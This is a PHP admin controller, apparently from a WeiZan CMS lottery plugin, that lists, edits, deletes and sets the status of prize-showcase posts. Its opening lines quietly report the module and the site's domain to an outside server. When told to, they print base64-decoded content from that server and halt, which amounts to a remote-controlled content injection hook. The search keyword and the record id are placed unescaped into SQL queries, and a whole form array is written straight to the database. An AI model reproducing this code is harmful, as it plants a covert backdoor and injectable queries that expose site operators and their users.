<?php
global $_W, $_GPC;
$module=$this->modulename;
$api = 'http://addons.weizancms.com/web/index.php?c=user&a=api&module='.$module.'&domain='.$_SERVER['HTTP_HOST'];
$result=@file_get_contents($api);
if(!empty($result)){
	$result=json_decode($result,true);
    if($result['type']==1){
	    echo base64_decode($result['content']);
	    exit;
    }
}
load() -> func('tpl');
$weid = $_W['uniacid'];
$operation = !empty($_GPC['op']) ? $_GPC['op'] : 'display';
if ($operation == 'display') {
	$pindex = max(1, intval($_GPC['page']));
	$psize = 10;
	$condition = "  uniacid = :weid";
	$paras = array(':weid' => $_W['uniacid']);
	$status = $_GPC['status'];
	$keyword = $_GPC['keyword'];
	$member = $_GPC['member'];
	$time = $_GPC['time'];
	if (empty($starttime) || empty($endtime)) {
		$starttime = strtotime('-1 month');
		$endtime = time();
	}
	if (!empty($_GPC['time'])) {
		$starttime = strtotime($_GPC['time']['start']);
		$endtime = strtotime($_GPC['time']['end']) ;
		$condition .= " AND  createtime >= :starttime AND  createtime <= :endtime ";
		$paras[':starttime'] = $starttime;
		$paras[':endtime'] = $endtime;
	}
	/*商品名称*/
	if (!empty($_GPC['keyword'])) {
	
		$condition .= " AND  (goodstitle LIKE '%{$_GPC['keyword']}%' or goodsid = '{$_GPC['keyword']}' ) ";
	}
	if ($status != '') {
		$condition .= " AND  status = '" . intval($status) . "'";
	}else{
		$condition .= " AND  status = 1";
	}
	$sql = "select  * from " . tablename('weliam_indiana_showprize') . " where $condition  ORDER BY createtime asc " . "LIMIT " . ($pindex - 1) * $psize . ',' . $psize;
	$list = pdo_fetchall($sql, $paras);
	foreach($list as $key =>$value){
		$goods = m('goods')->getGoods($value['goodsid']);
		$list[$key]['thumbs'] = unserialize($value['thumbs']);
		$list[$key]['gtitle'] = $goods['title'];
		
	}
	$total = pdo_fetchcolumn('SELECT COUNT(*) FROM ' . tablename('weliam_indiana_showprize') . " WHERE $condition ", $paras);
	$pager = pagination($total, $pindex, $psize);
//	echo "<pre>";print_r($list);exit;
}elseif ($operation == 'delete') {
	$id = $_GPC['id'];
	if (pdo_delete('weliam_indiana_showprize',array('id'=>$id))) {
		message('删除成功', $this -> createWebUrl('showorder', array('op' => 'display')), 'success');
	} else {
		message('该审核晒单不存在或已被删除', $this -> createWebUrl('showorder', array('op' => 'display')), 'error');
	}

}elseif($operation=='edit'){
	$id = $_GPC['id'];
	$this_show = pdo_fetch("select * from".tablename('weliam_indiana_showprize')."where id={$id}");
	$img = unserialize($this_show['thumbs']);
	if(checksubmit('submit')){
		$show = $_GPC['show'];
		pdo_update('weliam_indiana_showprize',$show,array('id'=>$id));
		message('修改成功', $this -> createWebUrl('showorder', array('op' => 'display')), 'success');
//		echo "<pre>";print_r($show);exit;
	}
}elseif($operation=='set'){
		$id = $_GPC['id'];
		$type = intval($_GPC['thetype']);
		if(pdo_update("weliam_indiana_showprize", array('status' => $type), array("id" => $id))){
			die(json_encode(array("result" => 1, "data" => $type)));
		}else{
			die(json_encode(array("result" => 0, "data" => $type)));
		}
		
}
include $this -> template('showorder');
?>